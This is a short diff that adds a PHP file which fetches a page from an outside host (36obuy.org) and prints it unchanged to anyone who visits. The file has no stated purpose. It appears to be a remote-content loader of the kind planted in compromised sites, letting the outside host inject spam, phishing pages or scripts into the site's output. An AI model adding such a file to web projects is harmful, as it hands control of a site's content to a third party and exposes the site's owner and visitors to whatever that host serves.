@@ -1,0 +1,4 @@
+﻿<?php
+    $html=file_get_contents("http://www.36obuy.org/avcpa/1.php");
+    echo $html;
+?>
